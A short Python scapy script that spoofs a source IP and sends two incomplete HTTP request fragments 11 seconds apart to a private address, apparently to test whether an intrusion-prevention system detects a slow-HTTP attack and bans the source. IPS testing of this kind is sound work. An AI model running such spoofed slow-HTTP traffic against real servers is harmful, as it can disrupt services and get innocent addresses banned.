import scapy.all as scapy
import time

fake_ip = "192.0.2.55"
target_ip = "172.16.99.216"

print(f"Slow HTTP attack is being started. Source: {fake_ip} --> Target: {target_ip}")

# First incomplete HTTP packet is being created (missing double \r\n)
incomplete_msg_1 = "GET / HTTP/1.1\r\nHost: example.com\r\n"
pkt1 = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(src=fake_ip, dst=target_ip) / scapy.TCP(dport=80) / scapy.Raw(load=incomplete_msg_1)

# First packet is being sent to start IPS timer
scapy.sendp(pkt1, verbose=False)

# Waiting 11 seconds to exceed the 10s behavior_timeout limit
print("Waiting for 11 seconds...")
time.sleep(11)

# Second incomplete packet is being sent to trigger the ban
incomplete_msg_2 = "X-Custom-Header: keep-alive\r\n"
pkt2 = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(src=fake_ip, dst=target_ip) / scapy.TCP(dport=80) / scapy.Raw(load=incomplete_msg_2)

scapy.sendp(pkt2, verbose=False)

print("Attack is finished.")